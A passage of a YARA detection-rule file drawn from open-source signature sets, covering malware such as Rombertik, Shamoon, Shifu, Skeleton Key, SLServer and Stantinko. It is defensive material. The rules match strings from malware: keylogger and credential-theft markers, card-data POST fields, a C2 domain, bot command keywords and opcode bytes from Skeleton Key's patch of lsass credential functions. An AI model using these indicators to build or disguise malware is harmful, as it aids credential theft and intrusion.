(https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"echo '<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=index.php?a=login\\\">';\" fullword ascii\n        $s1 = \"echo '<meta http-equiv=\\\"refresh\\\" content=\\\"2;url='.$website.'/index.php?a=login\" ascii\n        $s2 = \"header(\\\"location: $website/index.php?a=login\\\");\" fullword ascii\n        $s3 = \"$insertLogSQL -> execute(array(':id' => NULL, ':ip' => $ip, ':name' => $name, ':\" ascii\n        $s16 = \"if($_POST['username'] == $username && $_POST['password'] == $password){\" fullword ascii\n        $s17 = \"$SQL = $db -> prepare(\\\"TRUNCATE TABLE `logs`\\\");\" fullword ascii\n\n    condition:\n        filesize < 46KB and all of them\n}\n\nrule Rombertik_CarbonGrabber_Builder\n{\n    meta:\n        description = \"Rombertik / CarbonGrabber spyware builder\"\n        ref = \"http://blogs.cisco.com/security/talos/rombertik\"\n        classifications = \"Spyware\"\n        threat_names = \"Rombertik\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rombertik_CarbonGrabber_Builder\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"c:\\\\users\\\\iden\\\\documents\\\\visual studio 2010\\\\Projects\\\\FormGrabberBuilderC++\" ascii\n        $s1 = \"Host(www.panel.com): \" fullword ascii\n        $s2 = \"Path(/form/index.php?a=insert): \" fullword ascii\n        $s3 = \"FileName: \" fullword ascii\n        $s4 = \"~Rich8\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 35KB and all of them\n}\n\nrule Rombertik_CarbonGrabber_Builder_Server\n{\n    meta:\n        description = \"Rombertik / CarbonGrabber spyware builder server\"\n        ref = \"http://blogs.cisco.com/security/talos/rombertik\"\n        classifications = \"Spyware\"\n        threat_names = \"Rombertik\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Rombertik_CarbonGrabber_Builder_Server\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\" fullword ascii\n        $s3 = \"Software\\\\Microsoft\\\\Windows\\\\Currentversion\\\\RunOnce\" fullword ascii\n        $s4 = \"chrome.exe\" fullword ascii\n        $s5 = \"firefox.exe\" fullword ascii\n        $s6 = \"chrome.dll\" fullword ascii\n        $s7 = \"@KERNEL32.DLL\" fullword wide\n        $s8 = \"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome\" ascii\n        $s10 = \"&post=\" fullword ascii\n        $s11 = \"&host=\" fullword ascii\n        $s12 = \"Ws2_32.dll\" fullword ascii\n        $s16 = \"&browser=\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and 8 of them\n}\n\nrule rovnix_downloader : downloader\n{\n    meta:\n        description = \"Rovnix downloader\"\n        ref = \"https://blogs.mcafee.com/mcafee-labs/rovnix-downloader-sinkhole-time-checks/\"\n        classifications = \"Downloader\"\n        threat_names = \"Rovnix\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Intel Security\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"rovnix_downloader\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $sink1 = \"control\"\n        $sink2 = \"sink\"\n        $sink3 = \"hole\"\n        $sink4 = \"dynadot\"\n        $sink5 = \"block\"\n        $sink6 = \"malw\"\n        $sink7 = \"anti\"\n        $sink8 = \"googl\"\n        $sink9 = \"hack\"\n        $sink10 = \"trojan\"\n        $sink11 = \"abuse\"\n        $sink12 = \"virus\"\n        $sink13 = \"black\"\n        $sink14 = \"spam\"\n        $boot = \"BOOTKIT_DLL.dll\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($sink*) and $boot\n}\n\nrule Vinsula_Sayad_Binder : infostealer binder\n{\n    meta:\n        description = \"Sayad info stealer binder\"\n        ref = \"http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/\"\n        classifications = \"Spyware\"\n        threat_names = \"Sayad\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Vinsula, Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Vinsula_Sayad_Binder\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pdbstr = \"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Binder\\\\obj\\\\Debug\\\\Binder.pdb\"\n        $delphinativestr = \"DelphiNative.dll\" nocase\n        $sqlite3str = \"sqlite3.dll\" nocase\n        $winexecstr = \"WinExec\"\n        $sayadconfig = \"base.dll\" wide\n\n    condition:\n        all of them\n}\n\nrule Vinsula_Sayad_Client : infostealer\n{\n    meta:\n        description = \"Sayad info stealer client\"\n        ref = \"http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/\"\n        classifications = \"Spyware\"\n        threat_names = \"Sayad\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Vinsula, Inc\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Vinsula_Sayad_Client\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $pdbstr = \"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Client\\\\bin\\\\x86\\\\Debug\\\\Client.pdb\"\n        $sayadconfig = \"base.dll\" wide\n        $sqlite3str = \"sqlite3.dll\" nocase\n        $debugstr01 = \"Config loaded\" wide\n        $debugstr02 = \"Config parsed\" wide\n        $debugstr03 = \"storage uploader\" wide\n        $debugstr04 = \"updater\" wide\n        $debugstr05 = \"keylogger\" wide\n        $debugstr06 = \"Screenshot\" wide\n        $debugstr07 = \"sqlite found & start collectiong data\" wide\n        $debugstr08 = \"Machine info collected\" wide\n        $debugstr09 = \"browser ok\" wide\n        $debugstr10 = \"messenger ok\" wide\n        $debugstr11 = \"vpn ok\" wide\n        $debugstr12 = \"ftp client ok\" wide\n        $debugstr13 = \"ftp server ok\" wide\n        $debugstr14 = \"rdp ok\" wide\n        $debugstr15 = \"kerio ok\" wide\n        $debugstr16 = \"skype ok\" wide\n        $debugstr17 = \"serialize data ok\" wide\n        $debugstr18 = \"Keylogged\" wide\n\n    condition:\n        all of them\n}\n\nrule SeaDuke_Sample\n{\n    meta:\n        description = \"SeaDuke trojan\"\n        ref = \"http://goo.gl/MJ0c2M\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"SeaDuke\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SeaDuke_Sample\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"bpython27.dll\" fullword ascii\n        $s1 = \"email.header(\" fullword ascii\n        $s2 = \"LogonUI.exe\" fullword wide\n        $s3 = \"Crypto.Cipher.AES(\" fullword ascii\n        $s4 = \"mod is NULL - %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule CrowdStrike_Shamoon_DroppedFile\n{\n    meta:\n        description = \"Shamoon wiper\"\n        ref = \"http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf\"\n        classifications = \"Wiper\"\n        threat_names = \"Shamoon\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CrowdStrike_Shamoon_DroppedFile\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $testn123 = \"test123\" wide\n        $testn456 = \"test456\" wide\n        $testn789 = \"test789\" wide\n        $testdomain = \"testdomain.com\" wide\n        $pingcmd = \"ping -n 30 127.0.0.1 >nul\" wide\n\n    condition:\n        (any of ($testn*) or $pingcmd) and $testdomain\n}\n\nrule Shamoon2_Wiper\n{\n    meta:\n        description = \"Shamoon 2.0 wiper\"\n        ref = \"https://goo.gl/jKIfGB\"\n        classifications = \"Wiper\"\n        threat_names = \"Shamoon 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Shamoon2_Wiper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"\\\\??\\\\%s\\\\System32\\\\%s.exe\" fullword wide\n        $x1 = \"IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB\" wide\n        $s1 = \"UFWYNYNTS\" fullword wide\n        $s2 = \"\\\\\\\\?\\\\ElRawDisk\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them) or (3 of them)\n}\n\nrule Shamoon2_ComComp\n{\n    meta:\n        description = \"Shamoon 2.0 wiper\"\n        ref = \"https://goo.gl/jKIfGB\"\n        classifications = \"Wiper\"\n        threat_names = \"Shamoon 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth (with Binar.ly)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Shamoon2_ComComp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"mkdir %s%s > nul 2>&1\" fullword ascii\n        $s2 = \"p[%s%s%d.%s\" fullword ascii\n        $op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 }\n        $op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d }\n        $op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and (all of ($s*) or all of ($op*))\n}\n\nrule Shifu_Banking_Trojan\n{\n    meta:\n        description = \"Shifu banking trojan\"\n        ref = \"https://securityintelligence.com/shifu-masterful-new-banking-trojan-is-attacking-14-japanese-banks/\"\n        classifications = \"Spyware\"\n        threat_names = \"Shifu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Shifu_Banking_Trojan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"c:\\\\oil\\\\feet\\\\Seven\\\\Send\\\\Gather\\\\Dividerail.pdb\" fullword ascii\n        $s1 = \"listen above\" fullword wide\n        $s2 = \"familycould cost\" fullword wide\n        $s3 = \"SetSystemTimeAdjustment\" fullword ascii\n        $s4 = \"PeekNamedPipe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and ($x1 or all of ($s*))\n}\n\nrule SHIFU_Banking_Trojan\n{\n    meta:\n        description = \"Shifu banking trojan\"\n        ref = \"http://goo.gl/52n8WE\"\n        classifications = \"Spyware\"\n        threat_names = \"Shifu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SHIFU_Banking_Trojan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\Gather\\\\Dividerail.pdb\" ascii\n        $s0 = \"\\\\payload\\\\payload.x86.pdb\" ascii\n        $s1 = \"USER_PRIV_GUEST\" fullword wide\n        $s2 = \"USER_PRIV_ADMIN\" fullword wide\n        $s3 = \"USER_PRIV_USER\" fullword wide\n        $s4 = \"PPSWVPP\" fullword ascii\n        $s5 = \"WinSCard.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and ($x1 or 5 of ($s*))\n}\n\nrule shifu_shiz\n{\n    meta:\n        description = \"Shifu banking trojan\"\n        ref = \"https://researchcenter.paloaltonetworks.com/2017/01/unit42-2016-updates-shifu-banking-trojan/, https://raw.githubusercontent.com/Neo23x0/signature-base/master/yara/crime_shifu_trojan.yar, https://beta.virusbay.io/sample/browse/24a6dfaa98012a839658c143475a1e46\"\n        classifications = \"Spyware\"\n        threat_names = \"Shifu\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"J from THL <j@techhelplist.com>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"shifu_shiz\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $aa = \"auth_loginByPassword\" fullword ascii\n        $ab = \"back_command\" fullword ascii\n        $ac = \"back_custom1\" fullword ascii\n        $ad = \"GetClipboardData\" fullword ascii\n        $ae = \"iexplore.exe|opera.exe|java.exe|javaw.exe|explorer.exe|isclient.exe|intpro.exe|ipc_full.exe\" fullword ascii\n        $af = \"mnp.exe|cbsmain.dll|firefox.exe|clmain.exe|core.exe|maxthon.exe|avant.exe|safari.exe\" fullword ascii\n        $ag = \"svchost.exe|chrome.exe|notepad.exe|rundll32.exe|netscape.exe|tbb-firefox.exe|frd.exe\" fullword ascii\n        $ah = \"!inject\" fullword ascii\n        $ai = \"!deactivebc\" fullword ascii\n        $aj = \"!kill_os\" fullword ascii\n        $ak = \"!load\" fullword ascii\n        $al = \"!new_config\" fullword ascii\n        $am = \"!activebc\" fullword ascii\n        $an = \"keylog.txt\" fullword ascii\n        $ao = \"keys_path.txt\" fullword ascii\n        $ap = \"pass.log\" fullword ascii\n        $aq = \"passwords.txt\" fullword ascii\n        $ar = \"Content-Disposition: form-data; name=\\\"file\\\"; filename=\\\"report\\\"\" fullword ascii\n        $as = \"Content-Disposition: form-data; name=\\\"pcname\\\"\" fullword ascii\n        $at = \"botid=%s&ver=\" fullword ascii\n        $au = \"action=auth&np=&login=\" fullword ascii\n        $av = \"&ctl00%24MainMenu%24Login1%24UserName=\" fullword ascii\n        $aw = \"&cvv=\" fullword ascii\n        $ax = \"&cvv2=\" fullword ascii\n        $ay = \"&domain=\" fullword ascii\n        $az = \"LOGIN_AUTHORIZATION_CODE=\" fullword ascii\n        $ba = \"name=%s&port=%u\" fullword ascii\n        $bb = \"PeekNamedPipe\" fullword ascii\n        $bc = \"[pst]\" fullword ascii\n        $bd = \"[ret]\" fullword ascii\n        $be = \"[tab]\" fullword ascii\n        $bf = \"[bks]\" fullword ascii\n        $bg = \"[del]\" fullword ascii\n        $bh = \"[ins]\" fullword ascii\n        $bi = \"&up=%u&os=%03u&rights=%s&ltime=%s%d&token=%d&cn=\" fullword ascii\n\n    condition:\n        18 of them\n}\n\nrule skeleton_key_patcher\n{\n    meta:\n        description = \"Skeleton Key patcher\"\n        threat_names = \"Skeleton Key\"\n        ref = \"http://goo.gl/aAk3lN\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dell SecureWorks Counter Threat Unit\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"skeleton_key_patcher\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $target_process = \"lsass.exe\" wide\n        $dll1 = \"cryptdll.dll\"\n        $dll2 = \"samsrv.dll\"\n        $name = \"HookDC.dll\"\n        $patched1 = \"CDLocateCSystem\"\n        $patched2 = \"SamIRetrievePrimaryCredentials\"\n        $patched3 = \"SamIRetrieveMultiplePrimaryCredentials\"\n\n    condition:\n        all of them\n}\n\nrule skeleton_key_injected_code\n{\n    meta:\n        description = \"Skeleton Key patcher injected code\"\n        threat_names = \"Skeleton Key\"\n        ref = \"http://goo.gl/aAk3lN\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Dell SecureWorks Counter Threat Unit\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"skeleton_key_injected_code\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $injected = { 33 C0 85 C9 0F 95 C0 48 8B 8C 24 40 01 00 00 48 33 CC E8 4D 02 00 00 48 81 C4 58 01 00 00 C3 }\n        $patch_CDLocateCSystem = { 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48 8B FA 8B F1 E8 ?? ?? ?? ?? 48 8B D7 8B CE 48 8B D8 FF 50 10 44 8B D8 85 C0 0F 88 A5 00 00 00 48 85 FF 0F 84 9C 00 00 00 83 FE 17 0F 85 93 00 00 00 48 8B 07 48 85 C0 0F 84 84 00 00 00 48 83 BB 48 01 00 00 00 75 73 48 89 83 48 01 00 00 33 D2 }\n        $patch_SamIRetrievePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 49 8B F9 49 8B F0 48 8B DA 48 8B E9 48 85 D2 74 2A 48 8B 42 08 48 85 C0 74 21 66 83 3A 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 14 E8 ?? ?? ?? ?? 4C 8B CF 4C 8B C6 48 8B D3 48 8B CD FF 50 18 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }\n        $patch_SamIRetrieveMultiplePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 41 8B F9 49 8B D8 8B F2 8B E9 4D 85 C0 74 2B 49 8B 40 08 48 85 C0 74 22 66 41 83 38 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 12 E8 ?? ?? ?? ?? 44 8B CF 4C 8B C3 8B D6 8B CD FF 50 20 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }\n\n    condition:\n        any of them\n}\n\nrule SLServer_mutex\n{\n    meta:\n        description = \"SLServer malware mutex\"\n        threat_names = \"SLServer\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SLServer_mutex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $mutex = \"M&GX^DSF&DA@F\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $mutex\n}\n\nrule SLServer_command_and_control\n{\n    meta:\n        description = \"SLServer malware C&C server\"\n        threat_names = \"SLServer\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SLServer_command_and_control\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $c2 = \"safetyssl.security-centers.com\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $c2\n}\n\nrule SLServer_campaign_code\n{\n    meta:\n        description = \"SLServer malware\"\n        threat_names = \"SLServer\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SLServer_campaign_code\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $campaign = \"wthkdoc0106\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $campaign\n}\n\nrule SLServer_unknown_string\n{\n    meta:\n        description = \"SLServer malware\"\n        threat_names = \"SLServer\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"SLServer_unknown_string\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string = \"test-b7fa835a39\"\n\n    condition:\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $string\n}\n\nrule solarbot\n{\n    meta:\n        description = \"Solar bot\"\n        classifications = \"Bot\"\n        threat_names = \"Solar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"solarbot\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $str1 = \"v=%d.%d&u=%s&c=%s&s=%s&w=%d.%d.%d&b=%d\"\n\n    condition:\n        all of them\n}\n\nrule Stantinko_beds_plugin\n{\n    meta:\n        description = \"Stantinko adware BEDS plugin\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fr\u00e9d\u00e9ric Vachon\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"beds_plugin\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    condition:\n        pe.exports(\"CheckDLLStatus\") and pe.exports(\"GetPluginData\") and pe.exports(\"InitializePlugin\") and pe.exports(\"IsReleased\") and pe.exports(\"ReleaseDLL\")\n}\n\nrule Stantinko_beds_dropper\n{\n    meta:\n        description = \"Stantinko adware BEDS dropper\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fr\u00e9d\u00e9ric Vachon\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"beds_dropper\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    condition:\n        pe.imphash() == \"a7ead4ef90d9981e25728e824a1ba3ef\"\n}\n\nrule Stantinko_facebook_bot\n{\n    meta:\n        description = \"Stantinko adware Facebook bot\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fr\u00e9d\u00e9ric Vachon\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"facebook_bot\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = \"m_upload_pic&return_uri=https%3A%2F%2Fm.facebook.com%2Fprofile.php\" fullword ascii\n        $s2 = \"D:\\\\work\\\\brut\\\\cms\\\\facebook\\\\facebookbot\\\\Release\\\\facebookbot.pdb\" fullword ascii\n        $s3 = \"https%3A%2F%2Fm.facebook.com%2Fcomment%2Freplies%2F%3Fctoken%3D\" fullword ascii\n        $s4 = \"reg_fb_gate=https%3A%2F%2Fm.facebook.com%2Freg\" fullword ascii\n        $s5 = \"reg_fb_ref=https%3A%2F%2Fm.facebook.com%2Freg%2F\" fullword ascii\n        $s6 = \"&return_uri_error=https%3A%2F%2Fm.facebook.com%2Fprofile.php\" fullword ascii\n        $x1 = \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36\" fullword ascii\n        $x2 = \"registration@facebookmail.com\" fullword ascii\n        $x3 = \"https://m.facebook.com/profile.php?mds=\" fullword ascii\n        $x4 = \"https://upload.facebook.com/_mupload_/composer/?profile&domain=\" fullword ascii\n        $x5 = \"http://staticxx.facebook.com/connect/xd_arbiter.php?version=42#cb=ff43b202c\" fullword ascii\n        $x6 = \"https://upload.facebook.com/_mupload_/photo/x/saveunpublished/\" fullword ascii\n        $x7 = \"m.facebook.com&ref=m_upload_pic&waterfall_source=\" fullword ascii\n        $x8 = \"payload.commentID\" fullword ascii\n        $x9 = \"profile.login\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and (1 of ($s*) or 3 of ($x*))) or (all of them)\n}\n\nrule Stantinko_pds_plugins\n{\n    meta:\n        description = \"Stantinko adware PDS plugin\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fr\u00e9d\u00e9ric Vachon\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"pds_plugins\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = \"std::_Vector_val<CHTTPPostItem *,std::allocator<CHTTPPostItem *> >\" fullword ascii\n        $s2 = \"std::_Vector_val<CHTTPHeader *,std::allocator<CHTTPHeader *> >\" fullword ascii\n        $s3 = \"std::vector<CHTTPHeader *,std::allocator<CHTTPHeader *> >\" fullword ascii\n        $s4 = \"std::vector<CHTTPPostItem *,std::allocator<CHTTPPostItem *> >\" fullword ascii\n        $s5 = \"CHTTPHeaderManager\" fullword ascii\n        $s6 = \"CHTTPPostItemManager *\" fullword ascii\n        $s7 = \"CHTTPHeaderManager *\" fullword ascii\n        $s8 = \"CHTTPPostItemManager\" fullword ascii\n        $s9 = \"CHTTPHeader\" fullword ascii\n        $s10 = \"CHTTPPostItem\" fullword ascii\n        $s11 = \"std::vector<CCookie *,std::allocator<CCookie *> >\" fullword ascii\n        $s12 = \"std::_Vector_val<CCookie *,std::allocator<CCookie *> >\" fullword ascii\n        $s13 = \"CCookieManager *\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and (2 of ($s*)))\n}\n\nrule stantinko_pdb\n{\n    meta:\n        description = \"Stantinko adware PDB path\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Fr\u00e9d\u00e9ric Vachon\"\n        source = \"https://github.com/eset/malware-ioc\"\n        original_name = \"stantinko_pdb\"\n        license = \"BSD-2-Clause (https://opensource.org/licenses/BSD-2-Clause)\"\n\n    strings:\n        $s1 = \"D:\\\\work\\\\service\\\\service\\\\\" ascii\n\n    condition:\n        all of them\n}\n\nrule stantinko_droppers\n{\n    meta:\n        description = \"Stantinko adware dropper\"\n        ref = \"https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf\"\n        classifications = \"Adware\"\n        threat_names = \"Stantinko\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 